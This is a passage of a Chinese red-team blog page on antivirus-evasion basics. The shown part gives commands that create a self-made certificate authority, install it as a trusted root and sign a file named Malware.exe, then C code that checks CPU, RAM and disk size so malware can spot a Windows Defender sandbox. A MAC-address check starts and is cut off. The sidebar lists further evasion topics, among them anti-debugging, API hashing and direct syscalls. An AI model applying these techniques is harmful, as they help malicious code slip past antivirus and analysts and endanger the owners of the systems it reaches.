<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>å…æ€åŸºç¡€çŸ¥è¯† | RedTeaming</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="/img/redteam.ico">
    <script data-ad-client="ca-pub-7828333725993554" async="async" src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    <meta name="description" content="RedTeaming">
    <meta name="keywords" content="RedTeam,XTeamWing,RedTeaming,ä¿¡æ¯å®‰å…¨,ç½‘ç»œå®‰å…¨ï¼Œçº¢è“å¯¹æŠ—,çº¢é˜Ÿè¡ŒåŠ¨,æ¸—é€æµ‹è¯•">
    <meta name="baidu-site-verification" content="482fd3a21f12d6c3a2285ac992936bde">
    <meta name="theme-color" content="#5deff9">
    <meta name="referrer" content="no-referrer">
    <link rel="preload" href="/assets/css/0.styles.cb604a48.css" as="style"><link rel="preload" href="/assets/js/app.be83bd91.js" as="script"><link rel="preload" href="/assets/js/2.b71e909d.js" as="script"><link rel="preload" href="/assets/js/3.aae92b90.js" as="script"><link rel="preload" href="/assets/js/17.7e6ee0d8.js" as="script"><link rel="prefetch" href="/assets/js/10.576e2d25.js"><link rel="prefetch" href="/assets/js/11.45ae902f.js"><link rel="prefetch" href="/assets/js/12.78693917.js"><link rel="prefetch" href="/assets/js/13.1b2dd970.js"><link rel="prefetch" href="/assets/js/14.8346b3bc.js"><link rel="prefetch" href="/assets/js/15.c893a769.js"><link rel="prefetch" href="/assets/js/16.416058c5.js"><link rel="prefetch" href="/assets/js/18.b9af0164.js"><link rel="prefetch" href="/assets/js/19.2e02851a.js"><link rel="prefetch" href="/assets/js/20.82df4fa3.js"><link rel="prefetch" href="/assets/js/21.b7a6161a.js"><link rel="prefetch" href="/assets/js/22.3d51065a.js"><link rel="prefetch" href="/assets/js/23.0654865c.js"><link rel="prefetch" href="/assets/js/24.b3170837.js"><link rel="prefetch" href="/assets/js/25.96ec8595.js"><link rel="prefetch" href="/assets/js/26.bbaa98f3.js"><link rel="prefetch" href="/assets/js/27.6cfd0642.js"><link rel="prefetch" href="/assets/js/28.ee7f1e26.js"><link rel="prefetch" href="/assets/js/29.db5477f0.js"><link rel="prefetch" href="/assets/js/4.3486280d.js"><link rel="prefetch" href="/assets/js/5.f6baf9fa.js"><link rel="prefetch" href="/assets/js/6.af4fd23a.js"><link rel="prefetch" href="/assets/js/7.91266911.js"><link rel="prefetch" href="/assets/js/8.98cffdda.js"><link rel="prefetch" href="/assets/js/9.66ac5539.js">
    <link rel="stylesheet" href="/assets/css/0.styles.cb604a48.css">
  </head>
  <body class="theme-mode-light">
    <div id="app" data-server-rendered="true"><div class="theme-container sidebar-open have-rightmenu"><header class="navbar blur"><div title="ç›®å½•" class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/img/redteam.png" alt="RedTeaming" class="logo"> <span class="site-name can-hide">RedTeaming</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">é¦–é¡µ</a></div><div class="nav-item"><a href="/Blog/" class="nav-link">ğŸ¤¡Blog</a></div><div class="nav-item"><a href="/Marshal/" class="nav-link">ğŸ“Marshal</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="ç´¢å¼•" class="dropdown-title"><a href="/archives/" class="link-title">ç´¢å¼•</a> <span class="title" style="display:none;">ç´¢å¼•</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">åˆ†ç±»</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">æ ‡ç­¾</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">å½’æ¡£</a></li></ul></div></div> <a href="https://github.com/XTeam-Wing" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar" style="display:none;"><div class="blogger"><img src="https://i.loli.net/2020/12/23/2LlibEtVrvZoINa.png"> <div class="blogger-info"><h3>Wing</h3> <span>Less talk,More work!</span></div></div> <nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">é¦–é¡µ</a></div><div class="nav-item"><a href="/Blog/" class="nav-link">ğŸ¤¡Blog</a></div><div class="nav-item"><a href="/Marshal/" class="nav-link">ğŸ“Marshal</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="ç´¢å¼•" class="dropdown-title"><a href="/archives/" class="link-title">ç´¢å¼•</a> <span class="title" style="display:none;">ç´¢å¼•</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/categories/" class="nav-link">åˆ†ç±»</a></li><li class="dropdown-item"><!----> <a href="/tags/" class="nav-link">æ ‡ç­¾</a></li><li class="dropdown-item"><!----> <a href="/archives/" class="nav-link">å½’æ¡£</a></li></ul></div></div> <a href="https://github.com/XTeam-Wing" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>å®‰å…¨å¼€å‘</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>æ¸—é€æµ‹è¯•</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>äºŒè¿›åˆ¶å®‰å…¨</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>BypassAV</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading open"><span>åŸºç¡€çŸ¥è¯†</span> <span class="arrow down"></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/pages/e3b49b/" aria-current="page" class="active sidebar-link">å…æ€åŸºç¡€çŸ¥è¯†</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶" class="sidebar-link">ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æ›´æ”¹ä¾èµ–é¡¹" class="sidebar-link">æ›´æ”¹ä¾èµ–é¡¹</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#åŠ¨æ€æŸ¥æ€" class="sidebar-link">åŠ¨æ€æŸ¥æ€</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#wdæœ‰æ²™ç®±ä¼šå¯¹æœ¨é©¬è¿›è¡ŒåŠ¨æ€æŸ¥æ€ï¼Œé€šè¿‡æ²™ç®±è¯†åˆ«æ¥è¿›è¡Œç»•è¿‡ã€‚" class="sidebar-link">WDæœ‰æ²™ç®±ä¼šå¯¹æœ¨é©¬è¿›è¡ŒåŠ¨æ€æŸ¥æ€ï¼Œé€šè¿‡æ²™ç®±è¯†åˆ«æ¥è¿›è¡Œç»•è¿‡ã€‚</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#macåœ°å€" class="sidebar-link">Macåœ°å€</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#è™šæ‹Ÿè®¾å¤‡æ£€æµ‹" class="sidebar-link">è™šæ‹Ÿè®¾å¤‡æ£€æµ‹</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#hdd-name" class="sidebar-link">HDD Name</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#vm-ç‰¹å®šæ–‡ä»¶å’Œæ³¨å†Œè¡¨æ£€æŸ¥" class="sidebar-link">VM ç‰¹å®šæ–‡ä»¶å’Œæ³¨å†Œè¡¨æ£€æŸ¥</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æ–‡ä»¶åç§°è¢«avæ›´æ”¹" class="sidebar-link">æ–‡ä»¶åç§°è¢«AVæ›´æ”¹</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#è¢«çˆ¶è¿›ç¨‹å¯åŠ¨" class="sidebar-link">è¢«çˆ¶è¿›ç¨‹å¯åŠ¨</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æšä¸¾è°ƒè¯•å·¥å…·æŠ“åŒ…å·¥å…·" class="sidebar-link">æšä¸¾è°ƒè¯•å·¥å…·æŠ“åŒ…å·¥å…·</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æšä¸¾æ¯ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­åŠ è½½çš„æ¨¡å—ï¼Œå¹¶æ£€æŸ¥ä¸éœ€è¦çš„åç§°" class="sidebar-link">æšä¸¾æ¯ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­åŠ è½½çš„æ¨¡å—ï¼Œå¹¶æ£€æŸ¥ä¸éœ€è¦çš„åç§°</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æ£€æŸ¥çª—å£åç§°ï¼Œå¹¶å°†å…¶ä¸è¡¨ç¤ºå­˜åœ¨å¸¸è§æ¶æ„è½¯ä»¶åˆ†æå·¥å…·çš„åç§°è¿›è¡Œæ¯”è¾ƒ" class="sidebar-link">æ£€æŸ¥çª—å£åç§°ï¼Œå¹¶å°†å…¶ä¸è¡¨ç¤ºå­˜åœ¨å¸¸è§æ¶æ„è½¯ä»¶åˆ†æå·¥å…·çš„åç§°è¿›è¡Œæ¯”è¾ƒ</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#check-user-name-computer-name" class="sidebar-link">check user name-computer name</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ç”±äºæˆ‘ä»¬é€šå¸¸é’ˆå¯¹å…¬å¸ç¯å¢ƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‡è®¾ç”¨æˆ·çš„è®¡ç®—æœºæ˜¯åŸŸçš„æˆå‘˜ã€‚è®©æˆ‘ä»¬æ£€æŸ¥æœºå™¨çš„åŸŸåŠ å…¥çŠ¶æ€ï¼š" class="sidebar-link">ç”±äºæˆ‘ä»¬é€šå¸¸é’ˆå¯¹å…¬å¸ç¯å¢ƒï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å‡è®¾ç”¨æˆ·çš„è®¡ç®—æœºæ˜¯åŸŸçš„æˆå‘˜ã€‚è®©æˆ‘ä»¬æ£€æŸ¥æœºå™¨çš„åŸŸåŠ å…¥çŠ¶æ€ï¼š</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#åˆ†è¾¨ç‡æ£€æµ‹" class="sidebar-link">åˆ†è¾¨ç‡æ£€æµ‹</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#usbå­˜å‚¨æ£€æµ‹" class="sidebar-link">USBå­˜å‚¨æ£€æµ‹</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æ—¶åŒºæ£€æµ‹" class="sidebar-link">æ—¶åŒºæ£€æµ‹</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#è¯­è¨€æ£€æµ‹" class="sidebar-link">è¯­è¨€æ£€æµ‹</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æ£€æµ‹è‡ªåŠ¨åŒ–åˆ†æ" class="sidebar-link">æ£€æµ‹è‡ªåŠ¨åŒ–åˆ†æ</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ç½‘ç»œè¿æ¥" class="sidebar-link">ç½‘ç»œè¿æ¥</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ç”¨æˆ·äº¤äº’" class="sidebar-link">ç”¨æˆ·äº¤äº’</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æœ€è¿‘æ–‡æ¡£æ•°ç›®" class="sidebar-link">æœ€è¿‘æ–‡æ¡£æ•°ç›®</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#è¿›ç¨‹æ•°" class="sidebar-link">è¿›ç¨‹æ•°</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ç³»ç»Ÿè¿è¡Œæ—¶é—´" class="sidebar-link">ç³»ç»Ÿè¿è¡Œæ—¶é—´</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#å»¶è¿Ÿæ‰§è¡Œ" class="sidebar-link">å»¶è¿Ÿæ‰§è¡Œ</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#å†…æ ¸ç”¨æˆ·å…±äº«æ•°æ®" class="sidebar-link">å†…æ ¸ç”¨æˆ·å…±äº«æ•°æ®</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#å‡½æ•°hook" class="sidebar-link">å‡½æ•°Hook</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ç›´æ¥ç³»ç»Ÿè°ƒç”¨ç»•è¿‡-av-apihook" class="sidebar-link">ç›´æ¥ç³»ç»Ÿè°ƒç”¨ç»•è¿‡ AV-ApiHook</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#åè°ƒè¯•" class="sidebar-link">åè°ƒè¯•</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#é€šè¿‡æ£€æŸ¥ä»£ç ä¸­çš„æ›´æ”¹æ¥æ£€æµ‹æ–­ç‚¹" class="sidebar-link">é€šè¿‡æ£€æŸ¥ä»£ç ä¸­çš„æ›´æ”¹æ¥æ£€æµ‹æ–­ç‚¹</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#é€šè¿‡æ£€æŸ¥å†…å­˜é¡µæƒé™æ¥æ£€æµ‹æ–­ç‚¹" class="sidebar-link">é€šè¿‡æ£€æŸ¥å†…å­˜é¡µæƒé™æ¥æ£€æµ‹æ–­ç‚¹</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#å¼‚å¸¸å¤„ç†ç¨‹åºæ£€æµ‹è°ƒè¯•" class="sidebar-link">å¼‚å¸¸å¤„ç†ç¨‹åºæ£€æµ‹è°ƒè¯•</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#è‡ªè°ƒè¯•" class="sidebar-link">è‡ªè°ƒè¯•</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æ‰§è¡Œæ—¶é—´" class="sidebar-link">æ‰§è¡Œæ—¶é—´</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ä¸ºé€†å‘å·¥ç¨‹å¸ˆå¢åŠ éš¾åº¦" class="sidebar-link">ä¸ºé€†å‘å·¥ç¨‹å¸ˆå¢åŠ éš¾åº¦</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æ‰§è¡Œè·¯å¾„å›è°ƒ" class="sidebar-link">æ‰§è¡Œè·¯å¾„å›è°ƒ</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#tlsï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰å›è°ƒ" class="sidebar-link">TLSï¼ˆçº¿ç¨‹æœ¬åœ°å­˜å‚¨ï¼‰å›è°ƒ</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#é˜»æ­¢ç”¨æˆ·è¾“å…¥-éœ€è¦admin" class="sidebar-link">é˜»æ­¢ç”¨æˆ·è¾“å…¥-éœ€è¦admin</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#é™æ€åˆ†æå’Œæ··æ·†" class="sidebar-link">é™æ€åˆ†æå’Œæ··æ·†</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/pages/e3b49b/#pe" class="sidebar-link">PE</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#æ›´æ”¹hash" class="sidebar-link">æ›´æ”¹hash</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#é€šè¿‡åŠ¨æ€winapiå‡½æ•°è§£ææ¥éšè—å¯¼å…¥" class="sidebar-link">é€šè¿‡åŠ¨æ€WinAPIå‡½æ•°è§£ææ¥éšè—å¯¼å…¥</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#api-hashing" class="sidebar-link">API Hashing</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#shellcode-style" class="sidebar-link">shellcode style</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#pe-analysis" class="sidebar-link">PE analysis</a></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ç†µåˆ†æ" class="sidebar-link">ç†µåˆ†æ</a></li></ul></li><li class="sidebar-sub-header"><a href="/pages/e3b49b/#ç¼–è¯‘é€‰é¡¹" class="sidebar-link">ç¼–è¯‘é€‰é¡¹</a></li></ul></li></ul></section></li><li><section class="sidebar-group collapsable is-sub-group depth-1"><p class="sidebar-heading"><span>è‡ªåŠ¨åŒ–å·¥å…·</span> <span class="arrow right"></span></p> <!----></section></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>æ¼æ´åˆ©ç”¨</span> <span class="arrow right"></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>å†…ç½‘æ¸—é€</span> <span class="arrow right"></span></p> <!----></section></li></ul> <div class="sidebar-slot sidebar-slot-bottom"><!-- æ­£æ–¹å½¢ -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="3508773082"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div></aside> <div><main class="page"><div class="theme-vdoing-wrapper bg-style-1"><div class="articleInfo-wrap" data-v-583ea4e9><div class="articleInfo" data-v-583ea4e9><ul class="breadcrumbs" data-v-583ea4e9><li data-v-583ea4e9><a href="/" title="é¦–é¡µ" class="iconfont icon-home router-link-active" data-v-583ea4e9></a></li> <li data-v-583ea4e9><a href="/categories/?category=Blog" title="åˆ†ç±»" data-v-583ea4e9>Blog</a></li> <li data-v-583ea4e9><a href="/categories/?category=BypassAV" title="åˆ†ç±»" data-v-583ea4e9>BypassAV</a></li> <li data-v-583ea4e9><a href="/categories/?category=%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86" title="åˆ†ç±»" data-v-583ea4e9>åŸºç¡€çŸ¥è¯†</a></li></ul> <div class="info" data-v-583ea4e9><div title="ä½œè€…" class="author iconfont icon-touxiang" data-v-583ea4e9><a href="https://github.com/XTeam-Wing" target="_blank" title="ä½œè€…" class="beLink" data-v-583ea4e9>Wing</a></div> <div title="åˆ›å»ºæ—¶é—´" class="date iconfont icon-riqi" data-v-583ea4e9><a href="javascript:;" data-v-583ea4e9>2021-03-26</a></div> <!----></div></div></div> <!----> <div class="content-wrapper"><div class="right-menu-wrapper"><div class="right-menu-margin"><div class="right-menu-content"></div></div></div> <h1><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAB4AAAAeCAYAAAA7MK6iAAAAAXNSR0IArs4c6QAABGpJREFUSA3tVVtoXFUU3fvOI53UlmCaKIFmwEhsE7QK0ipFEdHEKpXaZGrp15SINsXUWvBDpBgQRKi0+KKoFeJHfZA+ED9KKoIU2gYD9UejTW4rVIzm0VSTziPzuNu1z507dibTTjL4U/DAzLn3nL3X2o91ziX6f9wMFdh6Jvbm9nNSV0msViVO6tN1Rm7NMu2OpeJ9lWBUTDxrJbYTS0hInuwciu9eLHlFxCLCZEk3MegsJmZ5K/JD6t7FkFdEvGUo1g7qJoG3MHImqRIn8/nzY1K9UPKKiJmtnUqHVE3Gbuay6vJE/N2FEmuxFjW2nUuE0yQXRRxLiTUAzs36zhZvOXJPdX850EVnnLZkB8prodQoM5JGj7Xk2mvC7JB8tG04Ef5PiXtG0UtxupRQSfTnBoCy554x18yJHI6I+G5Eru4LHmPJZEQsrvPUbMiA8G/WgMK7w7I+ez7++o2ANfbrjvaOl1tFMs+htG3IrZH9/hDX1Pr8Tc0UvH8tcX29KzAgIGcEkINyW5BF9x891hw6VYqgJHEk0huccS7vh3C6gTiODL+26huuBtbct8eZnqLML8PkxGYpuPZBqtqwkSjgc4mB5gbgig5i+y0UDK35LMxXisn9xQtK+nd26gTIHsHe/oblK/b29fUmN/8Y+9jAQrnBp56m1LcDlDp9irKTExSKduXJVWSqdBMA08pEJnEIOB3FPPMybu/oeV8zFeYN3xx576Q6RH+VmplE4ncQV5v+5rzSoyOU7PuEAg8g803PwBJ0CExno/jcMbN8tONYeOmHiuUNryvm3fRUy4tMPVLdAGkUhNWuggGrJcXPv+ouCjz0MKUHz1J2/E8IC9nqTabcxgaBYM0hPhD5Y65FsbxRQKxCQrDjDctW7PUM3HuZunFyifSAqEfuzCp48Il24luWUWZoyJCaPR82jE0+kFA643wRFVni4RYSq3ohJO2pZ7B5dO4xkDWbEpossJPLSrPjYID8rS2UHTlvyNxqIGsg674XJJ7vnh5L7PNwC4hh2sjCI96mzszOTpxLF0T7l88Yz7lAuK6OnL8gXLOnTvpzSb22YG8W7us3jSebFHeeqnXRG1vt+MoUM84LQIBmMsCTAcOauTh0T0l0neQK7m2bLMt2mGxU3HYssS0J2cdv5wljlPsrIuZLAG/2DOZIXgCYT8uMGZN+e2kSirfxZOPCsC0f24nTZzspnVn9VePS1Z5vubmAGGXG8ZFno9Hel0yfA5ZPhF7Dh972BQJ2qCpgH67lmWtBYbvk6sz02wjky2vXyz0XErP/kFB619js1BtwfOV4OPRqOQBjy3Qbk18vigUPPSD5ceHnwck7W9bhAqZdd7SuG7w4/P2F/GaJh8c7e9qgow+Q7cGBo+98WsLkuktFqiZabtXuQTu/Y5ETbR0v7tNSFnvrmu6pjdoan2KjMu8q/Hmj1EfCO2ZGfEIbIXKUlw8qaX9/b2oeSJmFksSeT/Fn0V3nSypChh4Gjh74ybO9aeZ/AN2dwciu2/MhAAAAAElFTkSuQmCC">
          å…æ€åŸºç¡€çŸ¥è¯†
        </h1> <div class="page-slot page-slot-top"><!-- å›ºå®š100% * 90pxå¯æ˜¾ç¤ºï¼Œmax-height:90pxæœªè§æ˜¾ç¤º-->
     <ins class="adsbygoogle"
          style="display:inline-block;width:100%;max-height:90px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6625304284"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="theme-vdoing-content content__default"><h1 id="å…æ€æŠ€å·§"><a href="#å…æ€æŠ€å·§" class="header-anchor">#</a> å…æ€æŠ€å·§</h1> <p>[TOC]</p> <h2 id="ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶"><a href="#ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶" class="header-anchor">#</a> ç­¾åäºŒè¿›åˆ¶æ–‡ä»¶</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>makecert -r -pe -n &quot;CN=Malwr CA&quot; -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv MalwrCA.pvk MalwrCA.cer
certutil -user -addstore Root MalwrCA.cer
makecert -pe -n &quot;CN=Malwr Cert&quot; -a sha256 -cy end -sky signature -ic MalwrCA.cer -iv MalwrCA.pvk -sv MalwrCert.pvk MalwrCert.cer
pvk2pfx -pvk MalwrCert.pvk -spc MalwrCert.cer -pfx MalwrCert.pfx
signtool sign /v /f MalwrCert.pfx /t http://timestamp.verisign.com/scripts/timstamp.dll Malware.exe
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><img src="https://i.loli.net/2021/03/26/Iqor3YHQLPX8ldz.jpg" alt="-w1630"></p> <p><img src="https://i.loli.net/2021/03/26/GOfIik9pNAjPCxh.jpg" alt="-w1602"></p> <p>è¿™å‡ ä¸ªå·¥å…·åœ¨Windows SDKé‡Œé¢
<img src="https://i.loli.net/2021/03/26/Iz4tnJ7ifEoV6dQ.jpg" alt="-w839"></p> <h2 id="æ›´æ”¹ä¾èµ–é¡¹"><a href="#æ›´æ”¹ä¾èµ–é¡¹" class="header-anchor">#</a> æ›´æ”¹ä¾èµ–é¡¹</h2> <p><img src="https://i.loli.net/2021/03/26/Cu53EU8YiDxjves.jpg" alt="-w952"></p> <h2 id="åŠ¨æ€æŸ¥æ€"><a href="#åŠ¨æ€æŸ¥æ€" class="header-anchor">#</a> åŠ¨æ€æŸ¥æ€</h2> <h3 id="wdæœ‰æ²™ç®±ä¼šå¯¹æœ¨é©¬è¿›è¡ŒåŠ¨æ€æŸ¥æ€ï¼Œé€šè¿‡æ²™ç®±è¯†åˆ«æ¥è¿›è¡Œç»•è¿‡ã€‚"><a href="#wdæœ‰æ²™ç®±ä¼šå¯¹æœ¨é©¬è¿›è¡ŒåŠ¨æ€æŸ¥æ€ï¼Œé€šè¿‡æ²™ç®±è¯†åˆ«æ¥è¿›è¡Œç»•è¿‡ã€‚" class="header-anchor">#</a> WDæœ‰æ²™ç®±ä¼šå¯¹æœ¨é©¬è¿›è¡ŒåŠ¨æ€æŸ¥æ€ï¼Œé€šè¿‡æ²™ç®±è¯†åˆ«æ¥è¿›è¡Œç»•è¿‡ã€‚</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>// check CPU
SYSTEM_INFO systemInfo;
GetSystemInfo(&amp;systemInfo);
DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
if (numberOfProcessors &lt; 2) return false;

// check RAM
MEMORYSTATUSEX memoryStatus;
memoryStatus.dwLength = sizeof(memoryStatus);
GlobalMemoryStatusEx(&amp;memoryStatus);
DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
if (RAMMB &lt; 2048) return false;

// check HDD
HANDLE hDevice = CreateFileW(L&quot;\\\\.\\PhysicalDrive0&quot;, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
DISK_GEOMETRY pDiskGeometry;
DWORD bytesReturned;
DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &amp;pDiskGeometry, sizeof(pDiskGeometry), &amp;bytesReturned, (LPOVERLAPPED)NULL);
DWORD diskSizeGB;
diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
if (diskSizeGB &lt; 100) return false;
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br></div></div><h3 id="macåœ°å€"><a href="#macåœ°å€" class="header-anchor">#</a> Macåœ°å€</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>DWORD adaptersListSize = 0;
GetAdaptersAddresses(AF_UNSPEC, 0, 0, 0, &amp;adaptersListSize);
IP_ADAPTER_ADDRESSES* pAdaptersAddresses = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, adaptersListSize);
if (pAdaptersAddresses)
{
	GetAdaptersAddresses(AF_UNSPEC, 0, 0, pAdaptersAddresses, &amp;adaptersListSize);
	char mac[6] = { 0 };
	while (pAdaptersAddresses)
	{
		if (pAdaptersAddresses-&gt;PhysicalAddressLength == 6)
		{
